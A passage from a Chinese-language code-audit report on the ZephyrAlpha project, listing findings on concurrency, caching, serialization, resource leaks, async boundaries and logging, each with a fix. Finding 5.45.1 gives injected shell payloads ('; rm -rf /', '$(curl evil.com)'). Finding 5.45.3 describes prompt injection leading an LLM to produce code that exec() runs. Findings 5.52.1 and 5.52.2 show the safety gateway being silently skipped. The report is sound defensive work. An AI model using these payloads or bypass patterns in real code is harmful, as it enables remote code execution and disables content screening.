- **文件**：[rollback_state_machine.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rollback/rollback_state_machine.py#L100)
- **证据**：第100-126行transition()直接赋值new_state，无终态检查、无锁、无审计日志记录
- **问题**：回滚状态机三重缺失：终态可被修改+并发不安全+无追溯
- **影响**：回滚过程状态被篡改无感知；并发回滚冲突
- **修复**：加终态校验+threading.Lock+审计日志写入

#### 5.41.8 [MEDIUM] TaskLifecycleManager FAILED非终态
- **文件**：全项目（TaskLifecycleManager实现）
- **证据**：FAILED状态可转换回RUNNING（"重试"），但无重试次数上限
- **问题**：FAILED语义模糊（是终态还是中间态？）
- **影响**：失败任务可无限重试；状态机语义不清
- **修复**：明确FAILED为中间态+max_retries限制，或设为终态+新建RETRYING状态

#### 5.41.9 [MEDIUM] TaskLifecycleManager.transition无并发锁
- **文件**：全项目（TaskLifecycleManager.transition实现）
- **证据**：transition()方法读写self.state无锁；多worker并发调用
- **问题**：并发转换竞态
- **影响**：状态不一致
- **修复**：加threading.Lock或asyncio.Lock

#### 5.41.10 [MEDIUM] RollbackStateMachine未复用shared.StateMachine基类
- **文件**：[rollback_state_machine.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/rollback/rollback_state_machine.py) vs shared.StateMachine
- **证据**：RollbackStateMachine独立实现transition逻辑，未继承shared.StateMachine基类
- **问题**：状态机逻辑重复实现，违反SSoT
- **影响**：修复需改多处；行为可能不一致
- **修复**：继承shared.StateMachine，复用转换校验逻辑

#### 5.41.11 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 6 | 5.41.1/5.41.2/5.41.3/5.41.4/5.41.5/5.41.7 |
| MEDIUM | 4 | 5.41.6/5.41.8/5.41.9/5.41.10 |
| **合计** | **10** | |

---

### 5.42 代码注释与API文档（4个，第12轮新增）

> 维度说明：核心函数docstring完整性、文档与代码行为一致性、结构性bug导致的定义缺失。

#### 5.42.1 [MEDIUM] 核心治理函数缺docstring
- **文件**：[git_commit_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/governance/git_commit_gateway.py)等多处
- **证据**：Grep `def [a-z_]+\(self`匹配的函数中，约40%无docstring；关键方法如`_check_pure_assertion`/`_check_deprecated`无说明
- **问题**：核心治理函数无文档，新AI难以理解意图
- **影响**：维护成本高；违反trae_060新AI可发现性原则
- **修复**：为核心治理函数补充docstring（含Args/Returns/Raises）

#### 5.42.2 [MEDIUM] docstring标"deprecated"但方法被活跃调用
- **文件**：全项目
- **证据**：存在方法docstring写"Deprecated: use X instead"但Grep显示生产代码仍活跃调用该方法
- **问题**：文档与代码行为矛盾
- **影响**：开发者困惑；误用已弃用API
- **修复**：若真弃用则移除调用方改用新API；若仍需用则移除deprecated标记

#### 5.42.3 [LOW] evaluate_batch存在死变量
- **文件**：[verdict_engine.py](file:///D:/ZephyrAlpha/src/zephyr/trading/verdict_engine.py#L325)
- **证据**：第325-355行`evaluate_batch`中存在赋值后从未读取的局部变量
- **问题**：死代码增加阅读负担
- **影响**：可维护性下降
- **修复**：删除死变量

#### 5.42.4 [HIGH] baseline_manager.py方法错误嵌套在模块级函数内（结构性bug）
- **文件**：[baseline_manager.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/baseline_manager.py#L132)
- **证据**：第132-140行方法定义缩进在模块级函数内部，导致这些方法从未被定义为类方法
- **问题**：结构性bug——方法定义在错误的作用域，类实际不含这些方法
- **影响**：调用这些方法会AttributeError；功能静默缺失
- **修复**：修正缩进，将方法定义移回类作用域

#### 5.42.5 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.42.4 |
| MEDIUM | 2 | 5.42.1/5.42.2 |
| LOW | 1 | 5.42.3 |
| **合计** | **4** | |

---

### 5.43 资源配额管理（5个，第12轮新增）

> 维度说明：CPU/内存/连接/并发/磁盘等资源配额限制，防止资源耗尽。

#### 5.43.1 [HIGH] Docker容器无CPU/内存限制
- **文件**：[docker-compose.yml](file:///D:/ZephyrAlpha/docker-compose.yml)
- **证据**：所有service定义无`deploy.resources.limits`；无`mem_limit`/`cpus`
- **问题**：任一容器可耗尽宿主机资源
- **影响**：单个失控容器拖垮全栈； noisy neighbor问题
- **修复**：为每个service设置CPU/内存上限

#### 5.43.2 [MEDIUM] Python进程无OS级内存限制（无RLIMIT）
- **文件**：全项目（Grep `resource.setrlimit|RLIMIT_AS|RLIMIT_DATA`无匹配）
- **证据**：无任何进程级内存限制设置
- **问题**：内存泄漏进程可耗尽系统内存
- **影响**：OOM Killer可能杀关键进程
- **修复**：在启动脚本设置RLIMIT_AS或用cgroups

#### 5.43.3 [MEDIUM] SQLite无连接池
- **文件**：全项目（SQLite连接管理）
- **证据**：每次操作`sqlite3.connect(db_path)`新建连接，无连接池复用
- **问题**：频繁连接创建开销；连接数无上限
- **影响**：性能下降；文件锁竞争
- **修复**：使用连接池或单连接复用（SQLite单写者模型）

#### 5.43.4 [MEDIUM] asyncio.gather无Semaphore限制并发
- **文件**：全项目（Grep `asyncio.gather`多处）
- **证据**：多处`asyncio.gather(*tasks)`无Semaphore限制并发数；tasks可能数百个
- **问题**：无并发上限，可能同时发起数百IO请求
- **影响**：下游限流/连接耗尽/自身内存压力
- **修复**：用`asyncio.Semaphore(N)`限制并发

#### 5.43.5 [LOW] 磁盘使用已采集但未纳入压力分类
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py)
- **证据**：采集disk_usage但健康检查逻辑未将磁盘压力纳入分类（仅CPU/内存）
- **问题**：磁盘满不会触发健康检查告警
- **影响**：磁盘耗尽导致写入失败无预警
- **修复**：将disk_usage纳入压力分类阈值

#### 5.43.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.43.1 |
| MEDIUM | 3 | 5.43.2/5.43.3/5.43.4 |
| LOW | 1 | 5.43.5 |
| **合计** | **5** | |

---

### 5.44 批处理正确性（5个，第12轮新增）

> 维度说明：批量操作的大小限制、超时、失败处理、正确使用executemany等。

#### 5.44.1 [HIGH] evaluate_batch无批次大小限制/无整体超时
- **文件**：[verdict_engine.py](file:///D:/ZephyrAlpha/src/zephyr/trading/verdict_engine.py#L325)
- **证据**：第325-355行`evaluate_batch(items)`无max_batch_size校验、无整体超时
- **问题**：传入10000条则同步处理全部，可能阻塞数分钟
- **影响**：单次大批次导致超时/内存压力
- **修复**：限制max_batch_size（如100）+ 整体timeout

#### 5.44.2 [HIGH] submit_batch return_exceptions=False致单失败丢弃全部成功
- **文件**：[gpu_consensus_scheduler.py](file:///D:/ZephyrAlpha/src/zephyr/trading/gpu_consensus_scheduler.py#L221)
- **证据**：第221-223行`asyncio.gather(*tasks, return_exceptions=False)`——任一异常立即抛出，已完成的成功结果被丢弃
- **问题**：一批中单个失败导致全部重做
- **影响**：浪费计算资源；延迟增加
- **修复**：设`return_exceptions=True`，单独处理失败项

#### 5.44.3 [MEDIUM] bulk_record_via_db_contract逐行execute而非executemany
- **文件**：[db_bridge.py](file:///D:/ZephyrAlpha/src/zephyr/ops/db_bridge.py#L111)
- **证据**：第111-151行`for record in records: cursor.execute(sql, record)`——N条记录N次往返
- **问题**：N+1 DB往返，性能差
- **影响**：大批量写入慢；DB连接占用久
- **修复**：改用`cursor.executemany(sql, records)`

#### 5.44.4 [MEDIUM] BatchIngestor无批次限制/无超时
- **文件**：全项目（BatchIngestor实现）
- **证据**：BatchIngestor.ingest(records)无max_batch_size/timeout参数
- **问题**：无界批次可能导致内存溢出
- **影响**：大写入导致OOM
- **修复**：增加批次大小限制+超时

#### 5.44.5 [MEDIUM] EventStore.record_batch无max_batch_size
- **文件**：全项目（EventStore.record_batch实现）
- **证据**：record_batch(events)直接写入全部，无大小校验
- **问题**：大批次写入可能超DB单事务限制
- **影响**：事务失败回滚全部
- **修复**：分片写入，每片≤1000条

#### 5.44.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.44.1/5.44.2 |
| MEDIUM | 3 | 5.44.3/5.44.4/5.44.5 |
| **合计** | **5** | |

---

### 5.45 输入验证与净化深度（5个，第13轮新增）

> 维度说明：命令注入、eval/exec代码执行、路径穿越防护、API响应清洗等输入边界安全。

#### 5.45.1 [HIGH] subprocess.run使用shell=True存在命令注入风险
- **文件**：[task_repo.py](file:///D:/ZephyrAlpha/src/zephyr/governance/task_repo.py#L1811)
- **证据**：第1811-1817行`subprocess.run(cmd, shell=True, ...)`——cmd来自任务卡片`post_sync_standard`字段，shell=True直接交给系统shell解释
- **问题**：若任务卡片被污染（如`; rm -rf /`或`$(curl evil.com)`），可执行任意命令
- **影响**：任意命令执行；违反项目自身process_sandbox.py禁止shell=True的规范
- **修复**：改用shell=False + shlex.split；或对cmd做白名单校验

#### 5.45.2 [MEDIUM] eval()用于类型注解解析
- **文件**：[enforcer.py](file:///D:/ZephyrAlpha/src/zephyr/shared/contracts/core/enforcer.py#L374)
- **证据**：第374行`hints[fld.name] = eval(ftype, globalns)`——当dataclass字段类型为字符串注解时用eval解析
- **问题**：若模块命名空间被污染，eval可执行任意代码
- **影响**：恶意dataclass定义可借eval执行任意代码
- **修复**：使用typing.get_type_hints()替代eval fallback

#### 5.45.3 [HIGH] exec()执行LLM生成的动态代码
- **文件**：[self_benchmark.py](file:///D:/ZephyrAlpha/src/zephyr/governance/self_benchmark.py#L350)
- **证据**：第350-355行`exec(source, ns)`——source来自LLM生成的代码，无沙箱隔离
- **问题**：LLM被提示注入时可生成恶意代码（如`__import__('os').system(...)`）
- **影响**：任意代码执行；prompt injection直接导致RCE
- **修复**：沙箱环境执行；或ast.parse白名单校验；至少限制`__builtins__`

#### 5.45.4 [MEDIUM] 路径穿越防护用子串匹配而非realpath边界检查
- **文件**：[gate_engine_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/gate_engine_server.py#L235)
- **证据**：第235-237行`if fragment in target_path`——仅子串匹配，未用os.path.realpath规范化
- **问题**：路径规范化绕过（`scripts/./archive`）、符号链接绕过
- **影响**：可绕过路径黑名单写入禁止目录
- **修复**：改用realpath + commonpath做边界检查

#### 5.45.5 [LOW] API响应清洗器覆盖面严重不足
- **文件**：[api_response_sanitizer.py](file:///D:/ZephyrAlpha/src/zephyr/governance/api_response_sanitizer.py#L27)
- **证据**：仅检查4个模式（`<script`/`javascript:`/`onerror=`/`onclick=`），遗漏`<img onerror`/`<svg onload`/`data:text/html`/编码变体；replace未忽略大小写
- **问题**：XSS注入可绕过清洗器
- **影响**：注入内容进入下游消费方
- **修复**：使用bleach/lxml.html.clean替代手写字符串替换

#### 5.45.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.45.1/5.45.3 |
| MEDIUM | 2 | 5.45.2/5.45.4 |
| LOW | 1 | 5.45.5 |
| **合计** | **5** | |

---

### 5.46 时间与时区处理（3个，第13轮新增）

> 维度说明：time.time vs monotonic混用、naive/aware datetime混用、时间戳不一致等时间处理正确性。

#### 5.46.1 [HIGH] time.time()用于TTL/时长计算（应用monotonic）
- **文件**：[semantic_cache.py](file:///D:/ZephyrAlpha/src/zephyr/governance/semantic_cache.py#L52), [staging_area.py](file:///D:/ZephyrAlpha/src/zephyr/trading/staging_area.py#L125), [resource_optimization.py](file:///D:/ZephyrAlpha/src/zephyr/trading/resource_optimization.py#L318)
- **证据**：semantic_cache用time.time()记created_at并算TTL过期；staging_area跨进程锁stale-lock检测用time.time()；resource_optimization健康检查用time.time()——三处均应用monotonic
- **问题**：time.time()受NTP/手动调时/夏令时影响可能回退，时钟回退时TTL永不过期/stale lock永不清理
- **影响**：缓存泄漏返回stale数据；跨进程锁死锁；健康检查age为负值
- **修复**：改用time.monotonic()记录和计算TTL

#### 5.46.2 [MEDIUM] naive datetime与aware datetime混用（100+处）
- **文件**：[work_orchestrator.py](file:///D:/ZephyrAlpha/src/zephyr/trading/work_orchestrator.py#L86)等100+处
- **证据**：work_orchestrator用datetime.now()（naive）；pipeline用datetime.utcnow()（naive，3.12+已弃用）；auto_runner用datetime.now(timezone.utc)（aware）；drift_models用datetime.utcnow()（naive）——项目已有time_utils.py规定"MUST使用now_utc()"但未执行
- **问题**：naive与aware做减法抛TypeError；跨时区对比产生静默错误；utcnow()在3.12+已弃用
- **影响**：跨模块时间对比异常或错误；审计日志时区歧义
- **修复**：全局替换datetime.now()/utcnow()→now_utc()；加CI检查禁止直接使用

#### 5.46.3 [LOW] datetime.now()与datetime.fromtimestamp()混用做age计算
- **文件**：[tiered_storage.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/tiered_storage.py#L44)
- **证据**：第44行`age = datetime.now() - datetime.fromtimestamp(path.stat().st_mtime)`——两者均naive local time，依赖本地时区一致
- **问题**：进程内时区被修改（os.environ['TZ']）则出错
- **影响**：tiered storage归档时间计算错误
- **修复**：统一用datetime.now(timezone.utc)和fromtimestamp(ts, tz=timezone.utc)

#### 5.46.4 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.46.1 |
| MEDIUM | 1 | 5.46.2 |
| LOW | 1 | 5.46.3 |
| **合计** | **3** | |

---

### 5.47 缓存一致性（3个，第13轮新增）

> 维度说明：缓存失效逻辑、缓存击穿防护、版本迁移等缓存与真源一致性。（注：MemoryCache LRU O(n)性能问题已在5.24.5记录，此处不重复）

#### 5.47.1 [HIGH] CacheInvalidationManager无自动失效——数据更新后缓存stale
- **文件**：[cache_invalidation.py](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/cache_invalidation.py#L33)
- **证据**：第33-46行仅提供手动set_version和check_staleness，无机制将数据更新事件自动关联到缓存失效；版本存储在内存dict（重启丢失）
- **问题**：若数据源更新后调用方忘记set_version，所有客户端持续读stale cache
- **影响**：缓存与真源不一致；基于过期数据做决策（风险限额/预算阈值）
- **修复**：接入事件总线自动set_version；持久化到SQLite/Redis；提供bump_version_on_write装饰器

#### 5.47.2 [MEDIUM] SemanticCache无锁重建——缓存击穿风险
- **文件**：[semantic_cache.py](file:///D:/ZephyrAlpha/src/zephyr/governance/semantic_cache.py#L46)
- **证据**：get返回None后调用方重新调用LLM（昂贵），然后put写入——无single-flight锁，并发请求同时miss同一key会并行调用LLM
- **问题**：热门prompt缓存击穿（thundering herd）
- **影响**：LLM API配额瞬时耗尽；高延迟
- **修复**：get miss时加asyncio.Lock/threading.Lock，仅持锁者重建

#### 5.47.3 [MEDIUM] CacheManager序列化版本无迁移逻辑
- **文件**：[cache_manager.py](file:///D:/ZephyrAlpha/src/zephyr/governance/cache_manager.py#L60)
- **证据**：CacheMetadata有version字段（默认"1.0.0"），但load()直接FunctionCache(**data)构造，从不检查版本兼容性；schema变更时触发_rebuild_from_scratch全量重建
- **问题**：schema升级后缓存全量丢失，无迁移逻辑
- **影响**：冷启动延迟激增
- **修复**：load()中检查version，不匹配则调用迁移函数

#### 5.47.4 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.47.1 |
| MEDIUM | 2 | 5.47.2/5.47.3 |
| **合计** | **3** | |

---

### 5.48 序列化安全（3个，第13轮新增）

> 维度说明：yaml.load安全、json.loads无schema校验、序列化版本管理等。（注：eval()用于类型注解问题已在5.45.2记录，此处不重复）

#### 5.48.1 [HIGH] yaml.load(FullLoader)而非safe_load
- **文件**：[pipeline_runner.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/pipeline_runner.py#L646), [audit_orchestrator/pipeline_runner.py](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/pipeline_runner.py#L643)
- **证据**：第646行`yaml.load(f, Loader=yaml.FullLoader)`——FullLoader可构造Python对象（!!python/object），同一文件line 668对manifest用了safe_load，不一致
- **问题**：depgraph文件被篡改时可实例化任意Python对象
- **影响**：DoS或绕过预期类型
- **修复**：统一改用yaml.safe_load(f)

#### 5.48.2 [MEDIUM] json.loads反序列化外部数据无schema校验
- **文件**：[base_repo.py](file:///D:/ZephyrAlpha/src/zephyr/governance/base_repo.py#L227), [ai_audit_logger.py](file:///D:/ZephyrAlpha/src/zephyr/trading/ai_audit_logger.py#L207), [conductor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/conductor.py#L156)
- **证据**：base_repo从SQLite读取JSON字符串字段后直接json.loads赋值无校验；ai_audit_logger从jsonl读取后直接entry.get("detail",{}).get(k)假设detail是dict；conductor解析后直接files.update(str(f) for f in fis)假设可迭代
- **问题**：被篡改/损坏的JSON结构导致运行时异常或静默错误
- **影响**：任务调度逻辑出错
- **修复**：用Pydantic模型定义schema，json.loads后用Model(**data)校验

#### 5.48.3 [MEDIUM] SerializationContract有版本号但from_json不校验
- **文件**：[serialization.py](file:///D:/ZephyrAlpha/src/zephyr/shared/io/serialization.py#L270)
- **证据**：SerializationContract定义format_version="1.0.0"，但from_json/from_dict从不检查输入数据版本是否兼容
- **问题**：序列化规则变更后旧数据反序列化静默使用错误格式
- **影响**：datetime解析错误或得到错误时间，无告警
- **修复**：from_json检查raw.get("_format_version")，不匹配则抛SerializationError

#### 5.48.4 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.48.1 |
| MEDIUM | 2 | 5.48.2/5.48.3 |
| **合计** | **3** | |

---

### 5.49 文件描述符与句柄泄漏（5个，第13轮新增）

> 维度说明：文件/DB连接/进程句柄未正确关闭，异常路径资源泄漏。

#### 5.49.1 [HIGH] subprocess.Popen未保存引用，进程成为孤儿
- **文件**：[auto_runtime_core.py](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L222)
- **证据**：第222行`subprocess.Popen(["ollama", "serve"], **kwargs)`——Popen对象未赋值给变量，无wait/communicate/terminate
- **问题**：ollama进程成为孤儿进程，无法被程序管理或关闭
- **影响**：孤儿进程持续占用资源；shutdown时无法终止
- **修复**：保存Popen引用到self._ollama_proc，shutdown路径中terminate()+wait()

#### 5.49.2 [MEDIUM] sqlite3.connect未用try/finally，异常时连接泄漏（系统性，8+文件）
- **文件**：[trend_analyzer.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/trend_analyzer.py#L98), [gate_persistence.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/gate_persistence.py#L61), [drift_engine.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/drift_engine.py#L507), [fix_reliability.py](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/fix_reliability.py#L53), [fix_pattern_miner.py](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/fix_pattern_miner.py#L38), [compliance_auditor.py](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/compliance_auditor.py#L39), [fix_budget.py](file:///D:/ZephyrAlpha/src/zephyr/security/access_control/auto_fix_engine_03/fix_budget.py#L58)
- **证据**：典型模式`conn = sqlite3.connect(...); conn.execute(...); conn.close()`——execute抛异常时close不执行，且被`except Exception: pass`吞掉
- **问题**：异常路径sqlite连接泄漏
- **影响**：长期运行导致FD耗尽或WAL膨胀
- **修复**：统一改用`with sqlite3.connect(...) as conn:`或try/finally

#### 5.49.3 [MEDIUM] tamper_proof_audit.py三函数异常分支未关闭连接
- **文件**：[tamper_proof_audit.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/tamper_proof_audit.py#L130)
- **证据**：snapshot_event_hash/count_states/setup_append_only三个函数均`try: conn=sqlite3.connect(); ...; conn.close(); except: return ""`——异常时conn未关闭
- **问题**：同5.49.2，异常路径泄漏
- **影响**：审计模块连接泄漏
- **修复**：try/finally中conn.close()

#### 5.49.4 [MEDIUM] drift_result_types.py遍历DB文件异常时连接泄漏
- **文件**：[drift_result_types.py](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/drift_result_types.py#L453)
- **证据**：第453-501行遍历多个db文件，`try: conn=sqlite3.connect(); ...; except: continue`——异常时conn泄漏
- **问题**：遍历多文件时任意异常即泄漏连接
- **影响**：批量扫描时连接累积泄漏
- **修复**：try/finally包裹conn.close()

#### 5.49.5 [MEDIUM] session_lifecycle.py长生命周期连接无close方法
- **文件**：[session_lifecycle.py](file:///D:/ZephyrAlpha/src/zephyr/trading/session_lifecycle.py#L486)
- **证据**：第486行`self._db_conn = sqlite3.connect(...)`长期持有，但全文搜索`def close`/`def shutdown`/`__del__`/`_db_conn.close`均无匹配
- **问题**：对象销毁时连接依赖GC释放，WAL不被checkpoint
- **影响**：数据可能丢失
- **修复**：添加close()方法并实现__enter__/__exit__或atexit注册

#### 5.49.6 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.49.1 |
| MEDIUM | 4 | 5.49.2/5.49.3/5.49.4/5.49.5 |
| **合计** | **5** | |

---

### 5.50 数值精度与类型安全（2个，第13轮新增）

> 维度说明：浮点数比较、金额计算精度、除零防护等数值正确性。（注：金额计算已全面使用Decimal，值得肯定）

#### 5.50.1 [LOW] 浮点数用==比较而非容差比较
- **文件**：[pricing_sync.py](file:///D:/ZephyrAlpha/src/zephyr/governance/pricing_sync.py#L126), [circuit_breaker.py](file:///D:/ZephyrAlpha/src/zephyr/ops/circuit_breaker.py#L104), [deployment_suppression.py](file:///D:/ZephyrAlpha/src/zephyr/ops/gates/deployment_suppression.py#L65)
- **证据**：pricing_sync第126行`if input_price == 0.0 and output_price == 0.0:`——同文件line 134已用abs()>1e-8容差，风格不一致；circuit_breaker和deployment_suppression用==0.0做哨兵值检查
- **问题**：浮点经多次运算产生1e-17残差时==0.0误判
- **影响**：当前场景风险低，但违反最佳实践
- **修复**：哨兵值改用is None；价格比较统一用容差

#### 5.50.2 [LOW] conversation_tax_detector浮点==0比较可能产生inf
- **文件**：[conversation_tax_detector.py](file:///D:/ZephyrAlpha/src/zephyr/governance/conversation_tax_detector.py#L105)
- **证据**：第105行`if older_avg == 0: return 0.0`——older_avg是sum(older)/len(older)，若older含浮点数求和产生1e-17残差，==0失败，后续recent_avg/older_avg除以极小值产生inf
- **问题**：浮点残差导致除以极小值
- **影响**：回复长度含浮点权重时产生inf decay值
- **修复**：改用`if abs(older_avg) < 1e-9:`

#### 5.50.3 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 0 | |
| MEDIUM | 0 | |
| LOW | 2 | 5.50.1/5.50.2 |
| **合计** | **2** | |

---

### 5.51 集合变异安全（1个，第13轮新增）

> 维度说明：可变默认参数、遍历中修改、浅拷贝共享引用等集合操作安全性。

#### 5.51.1 [HIGH] MCP create_task可变默认参数导致任务范围跨调用污染
- **文件**：[task_manager_server.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/task_manager_server.py#L146), [mcp/task_manager_server.py](file:///D:/ZephyrAlpha/src/zephyr/integration/mcp/task_manager_server.py#L146)
- **证据**：第146-155行`async def create_task(..., files_in_scope: list[str] = [], deliverables: list[str] = [], allowed_touch: list[str] = [], ..., downstream_outputs: list = [])`——Python可变默认参数在函数定义时创建一次，所有调用共享同一list对象
- **问题**：若函数体内对列表做原地修改（append/extend），修改跨调用持久化
- **影响**：前一次调用的files_in_scope等列表"污染"后一次调用，任务范围错误扩大——数据完整性风险
- **修复**：统一改为`files_in_scope: list[str] | None = None`，函数内`if files_in_scope is None: files_in_scope = []`

#### 5.51.2 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 1 | 5.51.1 |
| **合计** | **1** | |

---

### 5.52 异步/同步边界（4个，第13轮新增）

> 维度说明：async函数中阻塞IO、asyncio.run在已有loop中调用、同步/异步桥接策略等。

#### 5.52.1 [HIGH] asyncio.run+get_event_loop回退反模式，安全扫描被静默绕过（5处）
- **文件**：[default_security_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/governance/implementations/default_security_gateway.py#L71), [llm_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/llm_gateway.py#L69), [governance_adapter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/governance/governance_adapter.py#L57), [legacy_governance_adapter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/legacy_governance_adapter.py#L70), [a2a_governance_adapter.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/layer3_coordination/a2a_governance_adapter.py#L61)
- **证据**：典型模式`try: asyncio.run(gw.scan_input(...)) except RuntimeError: loop = asyncio.get_event_loop(); if loop.is_running(): return None; except Exception: pass`——async上下文中asyncio.run抛RuntimeError，回退到get_event_loop（3.10+已废弃），若loop.is_running()则return None跳过安全扫描
- **问题**：从async上下文调用时安全网关完全失效，恶意内容绕过LSG检测
- **影响**：安全漏洞——恶意内容可绕过安全扫描
- **修复**：重构为全async调用链，或用run_coroutine_threadsafe+线程池桥接，禁止return None静默跳过

#### 5.52.2 [HIGH] asyncio.run无回退，异常时安全扫描返回False（放行）
- **文件**：[context_injector.py](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_injector.py#L261)
- **证据**：第261行`result = asyncio.run(gateway.scan_input(content))`——`except Exception: return False`——asyncio.run抛RuntimeError时返回False（不阻止）
- **问题**：async环境中调用inject()时安全扫描始终返回False（放行）
- **影响**：安全网关完全失效
- **修复**：检测asyncio.get_running_loop()，有运行中loop则用run_in_executor桥接

#### 5.52.3 [MEDIUM] run_coroutine_threadsafe在同线程调用可能死锁
- **文件**：[pipeline_orchestrator.py](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py#L1749)
- **证据**：第1749-1753行`loop = asyncio.get_running_loop(); future = asyncio.run_coroutine_threadsafe(gw.scan_input(text), loop); result = future.result()`——若在事件循环所在线程调用，future.result()阻塞事件循环，协程永远无法被调度，形成死锁
- **问题**：同线程调用时事件循环卡死
- **影响**：整个进程冻结
- **修复**：改用`await loop.run_in_executor(None, asyncio.run, ...)`或将整个函数改为async

#### 5.52.4 [MEDIUM] 大量asyncio.run散布在同步代码中（42+处，架构级）
- **文件**：[evolution_engine.py](file:///D:/ZephyrAlpha/src/zephyr/ops/evolution_engine.py#L351), [scheduler.py](file:///D:/ZephyrAlpha/src/zephyr/ops/scheduler.py#L298), [escalation_engine.py](file:///D:/ZephyrAlpha/src/zephyr/governance/escalation_engine.py#L464), [delegation_engine.py](file:///D:/ZephyrAlpha/src/zephyr/governance/delegation_engine.py#L246), [chaos_injector.py](file:///D:/ZephyrAlpha/src/zephyr/governance/drift_detection/chaos_injector.py#L292)等42+处
- **证据**：42+处asyncio.run调用用于在同步函数中调用async安全网关，每个创建新事件循环
- **问题**：架构级问题——同步/异步边界缺乏统一桥接策略，各模块各自实现回退逻辑，质量参差不齐
- **影响**：调用链上游已存在运行中loop时触发5.52.1/5.52.2的失败路径
- **修复**：提供统一的run_coroutine_sync(coro)工具函数（参考trading/runtime/async_runtime.py:162-171已有的正确实现），全项目复用

#### 5.52.5 严重度汇总

| 严重度 | 数量 | 编号 |
|---|:---:|---|
| CRITICAL/HIGH | 2 | 5.52.1/5.52.2 |
| MEDIUM | 2 | 5.52.3/5.52.4 |
| **合计** | **4** | |

---

### 5.53 日志级别纪律（7个，第14轮新增）

> 维度说明：日志级别选择正确性、log-and-continue反模式、异常静默吞没等。

#### 5.53.1 [MEDIUM] 用INFO记录任务FAILED事件
- **文件**：[conductor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/conductor.py#L125)
- **证据**：`logger.info("Conductor: %s → FAILED", task_id)`——任务失败是负向事件却用INFO
- **问题**：FAILED事件在海量INFO中被淹没；按level过滤的告警系统会漏掉
- **修复**：改为logger.warning或logger.error

#### 5.53.2 [MEDIUM] 用INFO记录LLM Provider失败（3处副本）
- **文件**：[llm_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/integration/llm_gateway.py#L393), [pipeline/llm_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/llm_gateway.py#L406), [autonomy_core/llm_gateway.py](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/llm_gateway.py#L398)
- **证据**：`logger.info("LLMGateway provider=%s failed, trying next in chain", prov)`——Provider降级是异常路径
- **问题**：排障时难以从海量INFO定位哪一跳失败
- **修复**：改为logger.warning

#### 5.53.3 [MEDIUM] TaskQueue停止时errors>0仍用INFO
- **文件**：[task_queue.py](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/core/task_queue.py#L110)
- **证据**：`logger.info("TaskQueue stopped (dispatched=%d, errors=%d)", ..., errors)`——无条件INFO
- **问题**：累计大量errors时信息被埋在INFO中
- **修复**：errors>0时用warning

#### 5.53.4 [MEDIUM] 重试失败用INFO记录
- **文件**：[mcp_result_push.py](file:///D:/ZephyrAlpha/src/zephyr/governance/behavioral_admission/mcp_result_push.py#L340)
- **证据**：`_log.info("retry_failed %s → %s", task_id, status.value)`——推送重试失败
- **问题**：失败重试被当作正常信息
- **修复**：status≠PUSHED时用warning

#### 5.53.5 [MEDIUM] SearchReplace含failed项时仍用INFO
- **文件**：[action_dispatcher.py](file:///D:/ZephyrAlpha/src/zephyr/trading/action_dispatcher.py#L327)
- **证据**：`_log.info("BrainHands: %s SearchReplace applied=%d failed=%d", ..., failed)`——failed>0时仍INFO
- **问题**：代码修改部分失败被静默为INFO
- **修复**：failed>0时用warning

#### 5.53.6 [HIGH] 健康监控循环异常完全静默（无任何日志）
- **文件**：[health_monitor.py](file:///D:/ZephyrAlpha/src/zephyr/trading/health_monitor.py#L175)
- **证据**：第175-176行`except Exception: pass`——监控循环捕获所有异常后pass，不记录任何日志
